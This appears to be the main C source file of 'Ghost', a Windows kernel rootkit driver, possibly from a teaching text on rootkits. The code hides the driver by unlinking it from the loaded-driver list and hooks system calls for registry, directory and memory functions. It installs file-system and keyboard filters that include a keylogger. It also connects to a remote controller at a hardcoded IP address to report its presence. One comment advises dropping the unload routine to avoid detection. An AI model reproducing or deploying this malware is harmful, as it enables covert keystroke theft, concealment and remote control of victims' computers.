// Ghost
// Copyright Ric Vieler, 2006

#include "ntddk.h"
#include "initguid.h"
#include "Ghost.h"
#include "fileManager.h"
#include "configManager.h"
#include "hookManager.h"
#include "IoManager.h"
#include "commManager.h"
#include "filterManager.h"
#include "keyManager.h"
#include "registryManager.h"

#pragma code_seg()

// Global version data
ULONG majorVersion;
ULONG minorVersion;

// Global base address
PVOID kernel32Base = NULL;

// Global state data
BOOL allowEncryption = TRUE;

// Global keyboard data
KEYBOARD_STRUCT keyboardData = {0};

// Global devices
PDEVICE_OBJECT oldFileSysDevice = NULL;
PDEVICE_OBJECT newFileSysDevice = NULL;
PDEVICE_OBJECT oldNetworkDevice = NULL;
PDEVICE_OBJECT newNetworkDevice = NULL;
PDEVICE_OBJECT oldKeyboardDevice = NULL;
PDEVICE_OBJECT newKeyboardDevice = NULL;

// Used to circumvent memory protected System Call Table
PVOID* NewSystemCallTable = NULL;
PMDL pMyMDL = NULL;

// Pointer(s) to original function(s) - before hooking
ZWMAPVIEWOFSECTION OldZwMapViewOfSection;
ZWOPENKEY OldZwOpenKey;
ZWQUERYKEY OldZwQueryKey;
ZWENUMERATEKEY OldZwEnumerateKey;
ZWQUERYDIRECTORYFILE OldZwQueryDirectoryFile;
ZWPROTECTVIRTUALMEMORY OldZwProtectVirtualMemory;

// Process list offset
DWORD listOffset;

VOID OnUnload( IN PDRIVER_OBJECT pDriverObject )
{
    UNICODE_STRING deviceLink = { 0 };
	PFAST_IO_DISPATCH pFastIoDispatch;

	// remove filters
	if( newFileSysDevice )
		removeFilter( &oldFileSysDevice, &newFileSysDevice );
	if( newNetworkDevice )
		removeFilter( &oldNetworkDevice, &newNetworkDevice );
	if( newKeyboardDevice )
		StopKeylogger( &oldKeyboardDevice, &newKeyboardDevice );

	// free fast I/O resource
	pFastIoDispatch = pDriverObject->FastIoDispatch;
	pDriverObject->FastIoDispatch = NULL;
	if( pFastIoDispatch )
		ExFreePool( pFastIoDispatch );

	// Close the connection to remote controller
	CloseTDIConnection();

	// remove device controller
    RtlInitUnicodeString( &deviceLink, GHOST_DEVICE_LINK_NAME );
    IoDeleteSymbolicLink( &deviceLink );
	IoDeleteDevice( pDriverObject->DeviceObject );
	DbgPrint("comint32: Device controller removed.");

	// Unhook any hooked functions and return the Memory Descriptor List
	if( NewSystemCallTable )
	{
		UNHOOK( ZwMapViewOfSection, OldZwMapViewOfSection );
		UNHOOK( ZwOpenKey, OldZwOpenKey );
		UNHOOK( ZwQueryKey, OldZwQueryKey );
		UNHOOK( ZwEnumerateKey, OldZwEnumerateKey );
		UNHOOK( ZwQueryDirectoryFile, OldZwQueryDirectoryFile );
		FreeKeyTrackingData();

		MmUnmapLockedPages( NewSystemCallTable, pMyMDL );
		IoFreeMdl( pMyMDL );
	}

	DbgPrint("comint32: Hooks removed.");
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT pDriverObject,IN PUNICODE_STRING theRegistryPath )
{
	int loop;
	DRIVER_DATA* driverData;
    UNICODE_STRING deviceName = { 0 };
    UNICODE_STRING deviceLink = { 0 };
	PDEVICE_OBJECT pDeviceController;
	PFAST_IO_DISPATCH pFastIoDispatch;
	PWSTR SymbolicLinkList;

	// Get the operating system version
	PsGetVersion( &majorVersion, &minorVersion, NULL, NULL );

	// Major = 4: Windows NT 4.0, Windows Me, Windows 98 or Windows 95
	// Major = 5: Windows Server 2003, Windows XP or Windows 2000
	// Minor = 0: Windows 2000, Windows NT 4.0 or Windows 95
	// Minor = 1: Windows XP
	// Minor = 2: Windows Server 2003

	if ( majorVersion == 5 && minorVersion == 2 )
	{
		listOffset = 152;
		DbgPrint("comint32: Running on Windows 2003");
	}
	else if ( majorVersion == 5 && minorVersion == 1 )
	{
		listOffset = 136;
		DbgPrint("comint32: Running on Windows XP");
	}
	else if ( majorVersion == 5 && minorVersion == 0 )
	{
		listOffset = 160;
		DbgPrint("comint32: Running on Windows 2000");
	}
	else if ( majorVersion == 4 && minorVersion == 0 )
	{
		listOffset = 152;
		DbgPrint("comint32: Running on Windows NT 4.0");
	}
	else
	{
		listOffset = 0;
		DbgPrint("comint32: Running on unknown system");
	}

	// Hide this driver
	driverData = *((DRIVER_DATA**)((DWORD)pDriverObject + 20));
	if( driverData != NULL )
	{
		// unlink this driver entry from the driver list
		*((PDWORD)driverData->listEntry.Blink) = (DWORD)driverData->listEntry.Flink;
		driverData->listEntry.Flink->Blink = driverData->listEntry.Blink;
	}

	// Get the remote controller's address and port
	if( !NT_SUCCESS( Configure() ) )
	{
		DbgPrint("comint32: Configure failed");		
		return STATUS_UNSUCCESSFUL;
	}

	// Add kernel hooks
	if( !NT_SUCCESS( HookKernel() ) )
	{
		DbgPrint("comint32: HookKernel failed");		
		return STATUS_UNSUCCESSFUL;
	}

	// Open the connection to remote controller
	if( !NT_SUCCESS( OpenTDIConnection() ) )
	{
		DbgPrint("comint32: Could not open remote connection");		
		return STATUS_UNSUCCESSFUL;
	}

	// Tell remote controller that we're here
	SendToRemoteController( "207.46.40.60" );

	// Create the device controller
	RtlInitUnicodeString( &deviceName, GHOST_DEVICE_CREATE_NAME );
	IoCreateDevice( pDriverObject,
		 0,
		 &deviceName,
		 FILE_DEVICE_UNKNOWN,
		 0,
		 FALSE,
		 &pDeviceController );
    RtlInitUnicodeString( &deviceLink, GHOST_DEVICE_LINK_NAME );
    IoCreateSymbolicLink( &deviceLink, &deviceName );

	// Route standard I/O through our dispatch routine
	for(loop = 0; loop < IRP_MJ_MAXIMUM_FUNCTION; loop++)
		pDriverObject->MajorFunction[loop] = OnDispatch;

	// Route minimum fast I/O for file system filter
	pFastIoDispatch = (PFAST_IO_DISPATCH)ExAllocatePool( NonPagedPool, sizeof( FAST_IO_DISPATCH ) );
    if( !pFastIoDispatch )
	{
	    IoDeleteSymbolicLink( &deviceLink );
		IoDeleteDevice( pDeviceController );
		DbgPrint("comint32: Could not allocate FAST_IO_DISPATCH");		
		return STATUS_UNSUCCESSFUL;
	}
	RtlZeroMemory( pFastIoDispatch, sizeof( FAST_IO_DISPATCH ) );
	pFastIoDispatch->SizeOfFastIoDispatch = sizeof(FAST_IO_DISPATCH);
	pFastIoDispatch->FastIoDetachDevice = FastIoDetachDevice;
	pFastIoDispatch->FastIoCheckIfPossible = FastIoCheckIfPossible;
	pFastIoDispatch->FastIoRead = FastIoRead;
	pFastIoDispatch->FastIoWrite = FastIoWrite;
	pFastIoDispatch->FastIoQueryBasicInfo = FastIoQueryBasicInfo;
	pFastIoDispatch->FastIoQueryStandardInfo = FastIoQueryStandardInfo;
	pFastIoDispatch->FastIoLock = FastIoLock;
	pFastIoDispatch->FastIoUnlockSingle = FastIoUnlockSingle;
	pFastIoDispatch->FastIoUnlockAll = FastIoUnlockAll;
	pFastIoDispatch->FastIoUnlockAllByKey = FastIoUnlockAllByKey;
	pFastIoDispatch->FastIoDeviceControl = FastIoDeviceControl;
	pFastIoDispatch->FastIoQueryNetworkOpenInfo = FastIoQueryNetworkOpenInfo;
	pFastIoDispatch->MdlRead = FastIoMdlRead;
	pFastIoDispatch->MdlReadComplete = FastIoMdlReadComplete;
	pFastIoDispatch->PrepareMdlWrite = FastIoPrepareMdlWrite;
	pFastIoDispatch->MdlWriteComplete = FastIoMdlWriteComplete;
	pFastIoDispatch->FastIoReadCompressed = FastIoReadCompressed;
	pFastIoDispatch->FastIoWriteCompressed = FastIoWriteCompressed;
	pFastIoDispatch->MdlReadCompleteCompressed = FastIoMdlReadCompleteCompressed;
	pFastIoDispatch->MdlWriteCompleteCompressed = FastIoMdlWriteCompleteCompressed;
	pFastIoDispatch->FastIoQueryOpen = FastIoQueryOpen;
	pDriverObject->FastIoDispatch = pFastIoDispatch;

	// insert filters
	if( !NT_SUCCESS( insertFileFilter( pDriverObject,
		&oldFileSysDevice,
		&newFileSysDevice,
		L"\\DosDevices\\C:\\") ) )
		DbgPrint("comint32: Could not insert file system filter");

#if 0 // Can't unload as is
	if( !NT_SUCCESS( insertNetworkFilter( pDriverObject,
		&oldNetworkDevice,
		&newNetworkDevice,
		L"\\Device\\Tcp") ) )
		DbgPrint("comint32: Could not insert network filter");
#endif

	if( NT_SUCCESS( IoGetDeviceInterfaces( &GUID_DEVINTERFACE_KEYBOARD, NULL, 0, &SymbolicLinkList ) ) )
	{
		if( !NT_SUCCESS( insertKeyboardFilter( pDriverObject,
			&oldKeyboardDevice,
			&newKeyboardDevice,
			SymbolicLinkList) ) )
			DbgPrint("comint32: Could not insert keyboard filter");
		ExFreePool( SymbolicLinkList );
	}

	// Comment out in free build to avoid detection
	pDriverObject->DriverUnload = OnUnload; 

	return STATUS_SUCCESS;
}

